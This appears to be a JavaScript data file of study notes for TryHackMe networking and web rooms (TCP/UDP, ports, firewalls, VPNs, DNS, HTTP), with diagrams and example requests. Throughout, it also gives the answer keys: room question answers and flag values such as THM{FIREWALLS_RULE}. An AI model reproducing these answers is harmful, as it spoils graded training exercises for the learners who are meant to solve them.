            <p>Once the handshake successfully establishes the bidirectional connection, the application reveals the secret flag: <code>THM{TCP_CHATTER}</code>.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the value of the flag given at the end of the conversation?</i> <b>THM{TCP_CHATTER}</b></li>
            </ul>`},

          {title:"UDP/IP", notes:`
            <p>The <b>User Datagram Protocol (UDP)</b> is a lightweight, stateless alternative to TCP. It operates on a "fire-and-forget" model without preliminary handshakes, acknowledgments, or flow control.</p>
            <h3>Key Characteristics of UDP</h3>
            <ul>
              <li><b>Stateless:</b> Neither client nor server tracks sequence numbers or connection state. Packets are dispatched immediately into the network.</li>
              <li><b>Minimal Header Overhead:</b> A TCP header requires at least 20 bytes; a UDP header requires only <b>8 bytes</b> (Source Port, Destination Port, Length, Checksum).</li>
              <li><b>Speed over Perfection:</b> If a packet is lost in transit, UDP does not pause or request retransmission. For live voice or video streaming, dropping a fraction of a millisecond of audio is preferable to pausing the entire broadcast while waiting for retransmissions!</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What does the term "UDP" stand for?</i> <b>User Datagram Protocol</b></li>
              <li><i>What type of connection is "UDP"?</i> <b>stateless</b></li>
              <li><i>What protocol would you use to transfer a file?</i> <b>TCP</b></li>
              <li><i>What protocol would you use to have a video call?</i> <b>UDP</b></li>
            </ul>`},

          {title:"Ports 101 (Practical)", notes:`
            <p>When a server receives an incoming packet, how does it know whether that data is meant for a web server, an SSH login prompt, or a database query? It uses <b>Port Numbers</b>.</p>
            <p>Think of an IP address like the street address of an apartment building, and the <b>port number</b> like the specific apartment unit number inside!</p>
            <h3>Port Categories (Range: 0 to 65535)</h3>
            <ul>
              <li><b>Well-Known Ports (0 – 1023):</b> Reserved for standardized system protocols (require admin privileges on Linux).</li>
              <li><b>Registered Ports (1024 – 49151):</b> Assigned by IANA for specific vendor services (e.g. MySQL 3306, RDP 3389).</li>
              <li><b>Dynamic / Ephemeral Ports (49152 – 65535):</b> Temporarily opened by client operating systems for outbound connections.</li>
            </ul>

            <h3>Common Standard Ports Table</h3>
            <table>
              <tr><th>Protocol</th><th>Port</th><th>Description</th></tr>
              <tr><td><b>FTP (File Transfer Protocol)</b></td><td><code>21</code></td><td>Client-server file transfer.</td></tr>
              <tr><td><b>SSH (Secure Shell)</b></td><td><code>22</code></td><td>Secure encrypted command-line remote management.</td></tr>
              <tr><td><b>HTTP</b></td><td><code>80</code></td><td>Unencrypted World Wide Web traffic.</td></tr>
              <tr><td><b>HTTPS</b></td><td><code>443</code></td><td>Encrypted World Wide Web traffic (HTTP over TLS).</td></tr>
              <tr><td><b>SMB (Server Message Block)</b></td><td><code>445</code></td><td>Windows network file and printer sharing.</td></tr>
              <tr><td><b>RDP (Remote Desktop Protocol)</b></td><td><code>3389</code></td><td>Graphical remote desktop login.</td></tr>
            </table>
            <p>In network notation, ports are appended to an IP address with a colon, for example: <code>8.8.8.8:1234</code>.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the flag received from the challenge?</i> <b>THM{YOU_CONNECTED_TO_A_PORT}</b></li>
            </ul>`},

          {title:"Continue Your Learning: Extending Your Network", notes:`
            <p>You have mastered network data transmission fundamentals:</p>
            <ul>
              <li>The difference between Layer 3 Packets and Layer 2 Frames.</li>
              <li>Header fields: TTL, Checksums, and IP addresses.</li>
              <li>The TCP 3-Way Handshake (SYN, SYN/ACK, ACK) and 4-way teardown.</li>
              <li>Stateless UDP communication.</li>
              <li>Common port numbers (21, 22, 80, 443, 445, 3389).</li>
            </ul>
            <p>In the final room of Network Fundamentals, <b>Extending Your Network</b>, you will learn how to connect internal networks to the public Internet using Port Forwarding, Firewalls, VPNs, and VLANs.</p>`}
         ]},

        {name:"Extending Your Network", text:"Learn about some of the technologies used to extend networks out onto the Internet and the motivations for this.",
         icon:"🛡️", level:"easy", time:"20 min",
         tasks:[
          {title:"Introduction to Port Forwarding", notes:`
            <p>Devices inside a private home or corporate network use private IP addresses (e.g. <code>192.168.1.10</code>). These private addresses are non-routable over the public Internet. If you host a web server on your local machine, only devices connected to the same local intranet can access it.</p>
            <h3>What is Port Forwarding?</h3>
            <p><b>Port Forwarding</b> is a feature configured on your perimeter <b>router</b> that allows outside devices on the public Internet to access specific services hosted inside a private network:</p>
            <ul>
              <li>The router is assigned a public IP address by your ISP (e.g. <code>82.62.51.70</code>).</li>
              <li>A port forwarding rule instructs the router: <i>"Whenever any outside packet arrives on public port 80, forward it directly to internal IP 192.168.1.10 on port 80."</i></li>
              <li>External clients can now access the internal web server simply by navigating to <code>http://82.62.51.70</code>.</li>
            </ul>
            <p class="callout"><b>Port Forwarding vs. Firewalls:</b> Port forwarding determines <i>where</i> incoming traffic is directed, whereas firewalls determine <i>whether</i> traffic is permitted or blocked.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the name of the device that is used to configure port forwarding?</i> <b>router</b></li>
            </ul>`},

          {title:"Firewalls 101", notes:`
            <p>A <b>firewall</b> acts as network border security. It monitors all incoming and outgoing network traffic and decides whether to <b>permit</b> (allow) or <b>deny</b> (block) packets based on defined security rules.</p>
            <p>Firewalls typically inspect traffic operating at <b>Layer 3 (Network)</b> and <b>Layer 4 (Transport)</b> of the OSI model.</p>
            <h3>The Two Primary Firewall Categories</h3>
            <table>
              <tr><th>Firewall Type</th><th>How It Works</th><th>Pros &amp; Cons</th></tr>
              <tr>
                <td><b>Stateful Firewall</b></td>
                <td>Tracks the entire state and history of network connections. It verifies whether an incoming packet is a legitimate response to an established connection previously initiated from the inside.</td>
                <td><b>Pro:</b> Highly secure; recognizes complex protocol behaviors.<br><b>Con:</b> Requires significant CPU memory to maintain connection state tables.</td>
              </tr>
              <tr>
                <td><b>Stateless Firewall</b></td>
                <td>Inspects each individual packet in isolation against static rule filters (Source IP, Destination IP, Port, Protocol) without remembering previous packets.</td>
                <td><b>Pro:</b> Extremely fast; uses minimal system resources.<br><b>Con:</b> Less intelligent; cannot detect multi-packet state attacks. Excellent for filtering high-volume volumetric DDoS attacks.</td>
              </tr>
            </table>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What layers of the OSI model do firewalls operate at? For this answer, just provide the numbers in ascending order, separated by an ampersand (&amp;) i.e: 4 &amp; 5</i> <b>3 &amp; 4</b></li>
              <li><i>What category of firewall inspects the entire connection?</i> <b>stateful</b></li>
              <li><i>What category of firewall inspects individual packets?</i> <b>stateless</b></li>
            </ul>`},

          {title:"Practical - Firewall", notes:`
            <p>In this hands-on lab, you configure a network firewall defending web server <code>203.0.110.1</code> against a malicious packet flood:</p>
            <ul>
              <li><b>Green Packets:</b> Legitimate user traffic that must be permitted.</li>
              <li><b>Red Packets:</b> Malicious attacker traffic targeting web service port 80.</li>
            </ul>
            <p>By creating a targeted firewall rule blocking the malicious port 80 traffic destined for <code>203.0.110.1</code>, the attack is stopped and the flag is revealed: <code>THM{FIREWALLS_RULE}</code>.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the flag?</i> <b>THM{FIREWALLS_RULE}</b></li>
            </ul>`},

          {title:"VPN Basics", notes:`
            <p>A <b>Virtual Private Network (VPN)</b> creates an encrypted, dedicated tunnel between devices across an untrusted network (such as the public Internet). Devices connected inside the tunnel can communicate securely as if they were physically connected to the same private LAN.</p>
            <h3>Major Benefits of VPNs</h3>
            <ul>
              <li><b>Site-to-Site Connectivity:</b> Allows branch offices in London and New York to securely share file servers and databases over the Internet.</li>
              <li><b>Privacy &amp; Encryption:</b> Encrypts all transmitted data, preventing eavesdroppers or rogue Wi-Fi hotspot owners from sniffing plaintext credentials.</li>
              <li><b>Anonymity:</b> Masks the user's real public IP address behind the VPN server's exit gateway.</li>
              <li><b>TryHackMe Labs:</b> TryHackMe provides private OpenVPN/WireGuard profiles so you can directly attack and defend vulnerable practice machines without exposing them to the open web.</li>
            </ul>

            <h3>VPN Protocol Technologies</h3>
            <table>
              <tr><th>Protocol</th><th>Description</th></tr>
              <tr>
                <td><b>PPP (Point-to-Point Protocol)</b></td>
                <td>Provides authentication and basic data encryption between two directly connected nodes. It is non-routable on its own and cannot leave a local network without an encapsulation tunnel.</td>
              </tr>
              <tr>
                <td><b>PPTP (Point-to-Point Tunneling Protocol)</b></td>
                <td>Allows PPP frames to travel across IP networks. Very easy to configure, but historically vulnerable and uses weak legacy encryption.</td>
              </tr>
              <tr>
                <td><b>IPSec (Internet Protocol Security)</b></td>
                <td>A robust protocol suite that authenticates and encrypts packets directly using the <b>Internet Protocol (IP) framework</b>. Widely supported across enterprise firewalls and gateways.</td>
              </tr>
            </table>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What VPN technology only encrypts &amp; provides the authentication of data?</i> <b>PPP</b></li>
              <li><i>What VPN technology uses the IP framework?</i> <b>IPSec</b></li>
            </ul>`},

          {title:"LAN Networking Devices", notes:`
            <p>Modern corporate networks rely on multi-tier switching and routing architectures to balance speed and security.</p>
            <h3>Routers vs. Switches</h3>
            <ul>
              <li><b>Routers:</b> Perform <b>routing</b> at Layer 3 (Network). They interconnect different subnets and networks, determining optimal paths using IP routing tables.</li>
              <li><b>Layer 2 Switches:</b> Work at Layer 2 (Data Link). They forward Ethernet frames between connected ports based on hardware MAC addresses.</li>
              <li><b>Layer 3 Switches:</b> Advanced switches that combine the hardware wire-speed forwarding of Layer 2 with the intelligent IP routing capabilities of Layer 3 routers.</li>
            </ul>

            <h3>VLANs (Virtual Local Area Networks)</h3>
            <p>A <b>VLAN</b> allows a network administrator to logically partition a single physical switch into multiple isolated virtual networks:</p>
            <ul>
              <li>Example: Sales Department (VLAN 1 on <code>192.168.1.0/24</code>) and Accounting Department (VLAN 2 on <code>192.168.2.0/24</code>).</li>
              <li>Even though both departments plug their Ethernet cables into the exact same physical switch, computers in VLAN 1 cannot sniff or communicate with computers in VLAN 2 without going through an authorized router firewall rule.</li>
            </ul>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the verb for the action that a router does?</i> <b>routing</b></li>
              <li><i>What are the two different layers of switches? Separate these by a comma i.e.: Layer X,Layer Y</i> <b>Layer 2,Layer 3</b></li>
            </ul>`},

          {title:"Practical - Network Simulator", notes:`
            <p>The Network Simulator provides a real-time visualization of packet flows across hosts, switches, firewalls, and routers:</p>
            <ul>
              <li>Send a TCP packet from <b>computer1</b> to <b>computer3</b>.</li>
              <li>Observe the packet move through the local switch, pass through the firewall rules, travel across the router, and reach the destination host.</li>
              <li>Examining the interactive Network Log reveals exactly <b>5 HANDSHAKE entries</b> during connection negotiation.</li>
            </ul>
            <p>Successfully completing the transmission awards the completion flag: <code>THM{YOU'VE_GOT_DATA}</code>.</p>
            <p><b>Room questions:</b></p>
            <ul>
              <li><i>What is the flag from the network simulator?</i> <b>THM{YOU'VE_GOT_DATA}</b></li>
              <li><i>How many HANDSHAKE entries are there in the Network Log?</i> <b>5</b></li>
            </ul>`}
         ]}
        ]},
      {icon:"🕸️", title:"How The Web Works", intro:"In this module, we'll take you through the building blocks of the world wide web and explain in detail exactly what happens when you enter a website address into your browser. From DNS to HTTP protocol this module will give you all the information you need to understand the world wide web.", text:"To become a better hacker it's vital to understand the underlying functions of the world wide web and what makes it work.",
       rooms:[
        {name:"DNS in Detail", text:"Learn how DNS works and how it helps you access internet services.",
         icon:"🌍", level:"easy", time:"45 min",
         tasks:[
          {title:"What is DNS?", notes:`
            <p>The room opens with a TryHackMe video, <i>DNS in Detail - How the web works</i>, worth watching first.</p>
            <p><b>DNS (Domain Name System)</b> gives us a simple way to talk to devices on the internet without remembering complicated numbers.</p>
            <p>Like every house has a unique address for receiving mail, every computer on the internet has a unique address called an <b>IP address</b>, for example <code>104.26.10.229</code>: four sets of digits from 0 to 255 separated by periods. Remembering numbers like that for every website is not practical, so DNS lets you remember <code>tryhackme.com</code> instead.</p>
            ${rowSVG("dns1", ["tryhackme.com|easy to remember", "DNS|looks up the address", "104.26.10.229|the IP address"], [1])}`},

          {title:"Domain Hierarchy", notes:`
            <p>Domain names are organised in a hierarchy, like a tree. At the top is the <b>root domain</b>, below it the <b>top-level domains (TLDs)</b>, and below those the <b>second-level domains</b>.</p>
            ${domainTreeSVG()}
            <h3>TLD (top-level domain)</h3>
            <p>The right-most part of a domain name. In <code>tryhackme.com</code> the TLD is <code>.com</code>. There are two types:</p>
            <ul>
              <li><b>gTLD (generic top level):</b> historically told the user the domain's purpose: <code>.com</code> commercial, <code>.org</code> organisations, <code>.edu</code> education, <code>.gov</code> government. Because of demand there are now many new gTLDs such as <code>.online</code>, <code>.club</code>, <code>.website</code> and <code>.biz</code>, over 2000 TLDs in total.</li>
              <li><b>ccTLD (country code top level):</b> used for geographical purposes, e.g. <code>.ca</code> for Canada and <code>.co.uk</code> for the United Kingdom.</li>
            </ul>
            <h3>Second-level domain</h3>
            <p>In <code>tryhackme.com</code>, <code>.com</code> is the TLD and <code>tryhackme</code> is the second-level domain. When registering a domain name, the second-level domain is limited to <b>63 characters</b> plus the TLD, and can only use <b>a-z, 0-9 and hyphens</b> (it cannot start or end with a hyphen or have consecutive hyphens).</p>
            <h3>Subdomain</h3>
            <p>A subdomain sits on the left of the second-level domain, separated by a period, e.g. in <code>admin.tryhackme.com</code> the <code>admin</code> part is the subdomain. It has the same creation rules as a second-level domain: <b>up to 63 characters</b>, only a-z, 0-9 and hyphens (no leading, trailing or consecutive hyphens). You can chain several subdomains, like <code>jupiter.servers.tryhackme.com</code>, but the <b>whole domain name must stay at 253 characters or less</b>. There is no limit to how many subdomains you can create.</p>
            ${domainPartsSVG()}
            <table>
              <tr><th>Part</th><th>Max length</th><th>Allowed characters</th></tr>
              <tr><td>Second-level domain</td><td>63 characters</td><td>a-z, 0-9, hyphens (not at start or end, not consecutive)</td></tr>
              <tr><td>Subdomain</td><td>63 characters each</td><td>same as above</td></tr>
              <tr><td>Whole domain name</td><td>253 characters</td><td>(all parts together)</td></tr>
            </table>`},

          {title:"Record Types", notes:`
            <p>DNS is not only for websites. Multiple <b>record types</b> exist; these are the most common.</p>
            <table>
              <tr><th>Record</th><th>What it resolves to</th><th>Example / notes</th></tr>
              <tr><td><b>A</b></td><td>An IPv4 address</td><td><code>104.26.10.229</code></td></tr>
              <tr><td><b>AAAA</b></td><td>An IPv6 address</td><td><code>2606:4700:20::681a:be5</code></td></tr>
              <tr><td><b>CNAME</b></td><td>Another domain name</td><td>TryHackMe's shop subdomain <code>store.tryhackme.com</code> returns a CNAME to <code>shops.shopify.com</code>. A second DNS request is then made for that name to find the IP address.</td></tr>
              <tr><td><b>MX</b></td><td>The servers that handle email for the domain</td><td>e.g. <code>alt1.aspmx.l.google.com</code>. Comes with a <b>priority</b> flag telling the client which server to try first, so a backup server is used if the main one is down.</td></tr>
              <tr><td><b>TXT</b></td><td>Free text, any text-based data</td><td>Common uses: listing servers allowed to send email for the domain (helps against spam and spoofed email), and verifying ownership of a domain for third-party services.</td></tr>
            </table>
            ${rowSVG("cname", ["store.tryhackme.com|your request", "CNAME record|returns shops.shopify.com", "Second request|for shops.shopify.com", "A record|returns the IP address"], [1])}
            <h3>TXT record examples</h3>
            <pre><code>_acme-challenge.example.com TXT "token_value_here"
@ TXT "v=spf1 ip4:192.0.2.0/24 include:_spf.google.com include:amazonses.com ~all"
_dmarc.example.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com; adkim=s; aspf=s; pct=100"
@ TXT "MS=ms12345678"</code></pre>
            <p>As the name implies, TXT records are just strings of text.</p>`},

          {title:"Making A Request", notes:`
            <h3>What happens when you make a DNS request</h3>
            ${dnsRequestSVG()}
            <ol>
              <li>Your computer first checks its <b>local cache</b> for a recent lookup of the domain. If it is not there, a request goes to your <b>Recursive DNS server</b>.</li>
              <li>The <b>Recursive DNS server</b> is usually provided by your ISP, but you can choose your own. It also keeps a local cache of recent lookups. If the answer is cached it is sent straight back (common for popular services like Google, Facebook, Twitter). If not, a journey begins to find the answer, starting with the internet's root servers.</li>
              <li>The <b>root servers</b> act as the DNS backbone of the internet. Their job is to redirect you to the correct <b>Top Level Domain (TLD) server</b>. For <code>www.tryhackme.com</code> the root server recognises the <code>.com</code> TLD and refers you to the TLD server that handles <code>.com</code> addresses.</li>
              <li>The <b>TLD server</b> holds the records for where to find the <b>authoritative server</b> for the domain. The authoritative server is also known as the <b>nameserver</b> for the domain (for tryhackme.com they are <code>kip.ns.cloudflare.com</code> and <code>uma.ns.cloudflare.com</code>). A domain usually has several nameservers, so there is a backup if one goes down.</li>
              <li>The <b>authoritative DNS server</b> stores the DNS records for the domain and is where any updates to them are made. Depending on the record type, the record is sent back to the Recursive DNS server, where a local copy is cached for future requests, and then passed back to the client that asked.</li>
            </ol>
            <h3>TTL (Time To Live)</h3>
            <p>Every DNS record comes with a <b>TTL</b>: a number of seconds saying how long the response should be saved locally before you have to look it up again. Caching saves making a DNS request every time you communicate with a server.</p>
            <p><b>Room questions:</b> the field that sets how long a DNS record is cached, the type of DNS server usually provided by your ISP, and the type of server that holds all the records for a domain.</p>`},

          {title:"Practical", lab:true, notes:`
            <p>Click <b>View Site</b>. Using the website on the right, you build requests to make DNS queries and view the results. The site also shows the <b>command</b> you would run on your own computer if you wanted to make the same request yourself (command-line tools such as <code>nslookup</code> or <code>dig</code> do this).</p>
            <p>Use it to try the record types from Task 3 (A, AAAA, CNAME, MX, TXT) on a few domains and compare the results.</p>
            <div class="placeholder">My own takeaways and the commands I tried: coming soon.</div>`}
         ]},
        {name:"HTTP in Detail", text:"Learn about how you request content from a web server using the HTTP protocol.",
         icon:"💬", level:"easy", time:"30 min",
         tasks:[
          {title:"What is HTTP(S)?", lab:true, notes:`
            <p>The room starts with a TryHackMe video, <i>HTTP in detail - How the web works</i>.</p>
            <h3>HTTP (HyperText Transfer Protocol)</h3>
            <p>HTTP is what is used whenever you view a website. It was developed by Tim Berners-Lee and his team between 1989 and 1991. It is the <b>set of rules for communicating with web servers</b> to transmit webpage data, whether that is HTML, images, videos and so on.</p>
            <h3>HTTPS (HyperText Transfer Protocol Secure)</h3>
            <p>The secure version of HTTP. The data is <b>encrypted</b>, which stops other people from seeing what you send and receive, and it also assures you that you are talking to the <b>correct web server</b> and not something impersonating it.</p>
            ${httpCompareSVG()}
            <div class="placeholder">My own takeaways from the View Site demo: coming soon.</div>`},

          {title:"Requests And Responses", notes:`
            <p>To access a website, your browser makes <b>requests</b> to a web server for assets such as HTML and images, and downloads the <b>responses</b>. First you must tell the browser how and where to find these resources, and that is where URLs help.</p>
            <h3>What is a URL (Uniform Resource Locator)?</h3>
            <p>A URL is basically an instruction on how to access a resource on the internet. It does not need to use every feature in every URL.</p>
            ${urlSVG()}
            <table>
              <tr><th>Part</th><th>Meaning</th></tr>
              <tr><td><b>Scheme</b></td><td>Which protocol to use to access the resource, such as HTTP, HTTPS or FTP (File Transfer Protocol).</td></tr>
              <tr><td><b>User</b></td><td>Some services need authentication, so a username and password can be put in the URL to log in.</td></tr>
              <tr><td><b>Host</b></td><td>The domain name or IP address of the server you want to access.</td></tr>
              <tr><td><b>Port</b></td><td>The port to connect to, usually 80 for HTTP and 443 for HTTPS, but it can be any port from 1 to 65535.</td></tr>
              <tr><td><b>Path</b></td><td>The file name or location of the resource you want.</td></tr>
              <tr><td><b>Query string</b></td><td>Extra information sent to the path. For example <code>/blog?id=1</code> asks the blog path for the article with id 1.</td></tr>
              <tr><td><b>Fragment</b></td><td>A reference to a location on the requested page, often used on long pages so the browser jumps straight to a certain part.</td></tr>
            </table>
            <h3>Making a request</h3>
            <p>You can make a request with just one line: <code>GET / HTTP/1.1</code></p>
            ${rowSVG("rl", ["GET|the request method", "/|the page being requested", "HTTP/1.1|the protocol version"], [0])}
            <p>For a richer web experience you also send other data in <b>headers</b>, which carry extra information for the server (more in the Headers task).</p>
            ${rowSVG("rr", ["Browser|sends a request", "Request|GET / HTTP/1.1 + headers", "Web server|processes it", "Response|200 OK + the page"], [1,3])}
            <h3>Example request</h3>
            <pre><code>GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/

</code></pre>
            <ul>
              <li><b>Line 1:</b> uses the GET method, asks for the home page (<code>/</code>) and says we use HTTP version 1.1.</li>
              <li><b>Line 2:</b> tells the server which website we want (the Host).</li>
              <li><b>Line 3:</b> says we use Firefox version 87 (the User-Agent).</li>
              <li><b>Line 4:</b> tells the server the page that referred us here (the Referer).</li>
              <li><b>Line 5:</b> a blank line. HTTP requests always end with one to tell the server the request has finished.</li>
            </ul>
            <h3>Example response</h3>
            <pre><code>HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 09 Apr 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98

&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;TryHackMe&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    Welcome To TryHackMe.com
&lt;/body&gt;
&lt;/html&gt;</code></pre>
            <ul>
              <li><b>Line 1:</b> the HTTP version the server uses, then the <b>status code</b> (here <code>200 OK</code>, meaning the request completed successfully).</li>
              <li><b>Line 2:</b> the web server software and version.</li>
              <li><b>Line 3:</b> the current date, time and time zone of the server.</li>
              <li><b>Line 4:</b> the <b>Content-Type</b> header says what kind of data is coming, such as HTML, images, videos, PDF or XML.</li>
              <li><b>Line 5:</b> the <b>Content-Length</b> header says how long the response is, so the client can confirm no data is missing.</li>
              <li><b>Line 6:</b> a blank line marking the end of the response headers.</li>
              <li><b>Lines 7 to 14:</b> the requested information, here the homepage.</li>
            </ul>
            <p><b>Room questions:</b> which HTTP protocol version is used in the example, and which response header tells the browser how much data to expect.</p>`},

          {title:"HTTP Methods", notes:`
            <p>HTTP methods let the client show the <b>action it intends</b> when making a request. There are many, but you mostly deal with <b>GET</b> and <b>POST</b>.</p>
            <table>
              <tr><th>Method</th><th>Used for</th></tr>
              <tr><td><b>GET</b></td><td>Getting information from a web server</td></tr>
              <tr><td><b>POST</b></td><td>Submitting data to the web server and potentially creating new records</td></tr>
              <tr><td><b>PUT</b></td><td>Submitting data to a web server to update information</td></tr>
              <tr><td><b>DELETE</b></td><td>Deleting information or records from a web server</td></tr>
            </table>`},

          {title:"HTTP Status Codes", lab:true, notes:`
            <p>When an HTTP server responds, the first line always contains a <b>status code</b> telling the client the outcome of its request and sometimes how to handle it. Codes fall into five ranges:</p>
            <table>
              <tr><th>Range</th><th>Meaning</th></tr>
              <tr><td>100-199 Information</td><td>The first part of the request was accepted and the client should continue sending the rest. No longer very common.</td></tr>
              <tr><td>200-299 Success</td><td>The request was successful.</td></tr>
              <tr><td>300-399 Redirection</td><td>The request is redirected to another resource, a different page or a different website.</td></tr>
              <tr><td>400-499 Client errors</td><td>There was an error with the request itself.</td></tr>
              <tr><td>500-599 Server errors</td><td>Errors on the server side, usually a major problem with the server handling the request.</td></tr>
            </table>
            <h3>Common status codes</h3>
            <p>Applications can even define their own, but these are the ones you will meet most:</p>
            <table>
              <tr><th>Code</th><th>Meaning</th></tr>
              <tr><td>200 OK</td><td>The request completed successfully.</td></tr>
              <tr><td>201 Created</td><td>A resource was created (for example a new user or blog post).</td></tr>
              <tr><td>301 Moved Permanently</td><td>Redirects the browser to a new page, or tells search engines the page has moved for good.</td></tr>
              <tr><td>302 Found</td><td>Like 301, but only a temporary change that may change again soon.</td></tr>
              <tr><td>400 Bad Request</td><td>Something was wrong or missing in the request, for example a parameter the server expected was not sent.</td></tr>
              <tr><td>401 Not Authorised</td><td>You may not view this resource until you authorise, most commonly with a username and password.</td></tr>
              <tr><td>403 Forbidden</td><td>You do not have permission to view this resource, whether you are logged in or not.</td></tr>
              <tr><td>404 Page Not Found</td><td>The page or resource you requested does not exist.</td></tr>
              <tr><td>405 Method Not Allowed</td><td>The resource does not allow this method, e.g. a GET sent to <code>/create-account</code> when a POST was expected.</td></tr>
              <tr><td>500 Internal Service Error</td><td>The server hit an error it does not know how to handle.</td></tr>
              <tr><td>503 Service Unavailable</td><td>The server is overloaded or down for maintenance.</td></tr>
            </table>
            <p>If you learn visually, the website <b>http.cat</b> is a great way to study status codes. The View Site button shows what some of these look like in a browser.</p>
            <div class="placeholder">My own takeaways from the View Site demo: coming soon.</div>`},

          {title:"Headers", notes:`
            <p><b>Headers</b> are additional pieces of data you can send to the web server with a request. No header is strictly required, but you will find it hard to view a website properly without them.</p>
            <h3>Common request headers (client to server)</h3>
            <table>
              <tr><th>Header</th><th>Purpose</th></tr>
              <tr><td><b>Host</b></td><td>Some servers host several websites. The Host header says which one you want; otherwise you just get the server's default website.</td></tr>
              <tr><td><b>User-Agent</b></td><td>Your browser software and version. It helps the server format the site for your browser, since some HTML, JavaScript and CSS only work in certain browsers.</td></tr>
              <tr><td><b>Content-Length</b></td><td>When sending data such as a form, says how much data to expect so the server can check nothing is missing.</td></tr>
              <tr><td><b>Accept-Encoding</b></td><td>Which compression methods the browser supports, so the data can be made smaller for transmission.</td></tr>
              <tr><td><b>Cookie</b></td><td>Data sent to the server to help it remember your information (see Cookies).</td></tr>
            </table>
            <h3>Common response headers (server to client)</h3>
            <table>
              <tr><th>Header</th><th>Purpose</th></tr>
              <tr><td><b>Set-Cookie</b></td><td>Information to store, which gets sent back to the server on each request (see Cookies).</td></tr>
              <tr><td><b>Cache-Control</b></td><td>How long to keep the response content in the browser's cache before requesting it again.</td></tr>
              <tr><td><b>Content-Type</b></td><td>The type of data returned (HTML, CSS, JavaScript, images, PDF, video...), so the browser knows how to process it.</td></tr>
              <tr><td><b>Content-Encoding</b></td><td>The method used to compress the data to make it smaller for sending.</td></tr>
            </table>`},

          {title:"Cookies", lab:true, notes:`
            <p>Cookies are just a <b>small piece of data stored on your computer</b>. They are saved when you receive a <code>Set-Cookie</code> header from a web server. On every further request you make, you send the cookie data back to the server.</p>
            <p>HTTP is <b>stateless</b>: it does not keep track of your previous requests. Cookies fix that by reminding the server who you are, your personal settings for the site, or whether you have visited before.</p>
            <h3>Example: how a cookie travels</h3>
            ${cookieFlowSVG()}
            <ol>
              <li>The client requests the webpage from <code>http://cookies.thm</code>.</li>
              <li>The server replies with a simple page containing a form asking for the user's name.</li>
              <li>The client sends the form back with the name set to <code>adam</code> (a POST request).</li>
              <li>The server replies with a <code>Set-Cookie</code> header telling the client to save <code>name=adam</code>.</li>
              <li>On the next and every further request, the client sends <code>Cookie: name=adam</code> to the server.</li>
              <li>The server sees the cookie and, instead of showing the form, displays a "welcome back adam" message.</li>
            </ol>
            <p>Cookies have many uses but are most commonly used for <b>website authentication</b>. The value is not usually a clear-text password you can read, but a <b>token</b>: a unique secret code that is not easily guessable by a human.</p>
            <h3>Viewing your cookies</h3>
            <p>Use your browser's <b>developer tools</b>. Open the <b>Network</b> tab, which lists all the resources your browser requested. Click one to see a detailed breakdown of its request and response. If your browser sent a cookie, you will see it in the <b>Cookies</b> tab. (The View Site button at the top of the task has a how-to guide.)</p>
            <p><b>Room question:</b> which header is used to save cookies on your computer.</p>
            <div class="placeholder">My own takeaways from the View Site guide: coming soon.</div>`},

          {title:"Making Requests", lab:true, notes:`
            <p>Click <b>View Site</b>. It is an <b>emulator for making demo HTTP requests</b>. Using what you learnt in the earlier tasks (methods, paths, headers, status codes) you can build requests in it and use the responses to answer the room's questions.</p>
            <div class="placeholder">My own takeaways and the requests I tried: coming soon.</div>`}
         ]},
        {name:"How Websites Work", text:"To exploit a website, you first need to know how they are created.",
         icon:"🖥️", level:"easy", time:"25 min", premium:true,
         tasks:[
          {title:"How websites work", notes:`
            <p>By the end of this room you will know how websites are created and meet some basic security issues. The room starts with a TryHackMe video, <i>How Websites Work (HTML/JS &amp; Web Security)</i>.</p>
            <p>When you visit a website, your <b>browser</b> (like Safari or Google Chrome) makes a <b>request</b> to a <b>web server</b> asking for the information about the page. The server <b>responds</b> with data your browser uses to show you the page. A web server is just a dedicated computer somewhere else in the world that handles your requests.</p>
            ${webFlowSVG()}
            <p>A website is made of two major components:</p>
            <ol>
              <li><b>Front end (client side):</b> the way your browser renders a website.</li>
              <li><b>Back end (server side):</b> a server that processes your request and returns a response.</li>
            </ol>
            <p>Many other processes happen when your browser makes a request, but for now you only need to understand that you send a request to a server and it responds with data your browser uses to render the page.</p>
            <p><b>Room question:</b> which term describes the component of a web application rendered by your browser.</p>`},

          {title:"HTML", lab:true, notes:`
            <p>Websites are primarily created using three things:</p>
            <ul>
              <li><b>HTML</b> to build the website and define its structure</li>
              <li><b>CSS</b> to make it look good with styling options</li>
              <li><b>JavaScript</b> to add complex features and interactivity to pages</li>
            </ul>
            <p><b>HyperText Markup Language (HTML)</b> is the language websites are written in. <b>Elements</b> (also called <b>tags</b>) are the building blocks of HTML pages and tell the browser how to display content. This is a simple HTML document, and its structure is the same for every website:</p>
            <pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Page Title&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Example Heading&lt;/h1&gt;
        &lt;p&gt;Example paragraph..&lt;/p&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
            ${htmlTreeSVG()}
            <h3>The structure explained</h3>
            <ul>
              <li><code>&lt;!DOCTYPE html&gt;</code> says the page is a HTML5 document. It helps standardise behaviour across browsers and tells the browser to use HTML5 to interpret the page.</li>
              <li><code>&lt;html&gt;</code> is the <b>root element</b>: all other elements come after it.</li>
              <li><code>&lt;head&gt;</code> holds information about the page (such as the page title).</li>
              <li><code>&lt;body&gt;</code> defines the document's body. Only content inside the body is shown in the browser.</li>
              <li><code>&lt;h1&gt;</code> defines a large heading and <code>&lt;p&gt;</code> defines a paragraph.</li>
              <li>There are many other tags for different purposes: buttons (<code>&lt;button&gt;</code>), images (<code>&lt;img&gt;</code>), lists and much more.</li>
